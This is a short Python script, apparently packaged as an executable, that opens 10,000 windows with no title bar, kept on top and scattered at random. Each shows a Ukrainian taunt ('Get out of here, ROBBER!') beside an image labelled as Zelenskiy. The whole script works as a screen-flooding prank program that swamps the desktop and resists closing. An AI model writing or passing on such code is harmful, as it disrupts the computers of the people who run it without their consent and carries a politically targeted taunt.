import PySimpleGUI as sg
import time
import random
import sys
import os
try:
	p = sys._MEIPASS
except:
	p = os.path.abspath(".")

os.chdir(p)

for n in range(10000):
	exec(f"""
l{n} = [[sg.T('Вийди звідси РОЗБІЙНИК!', font=("", 25))],[sg.Image('zelenskiy.png')]]
w{n}=sg.Window('Zelenskiy', layout=l{n}, no_titlebar=True, grab_anywhere=True, keep_on_top=True)
w{n}.read(timeout=0)
w{n}.Move(random.randint(1,1000),random.randint(1,1000))
""")
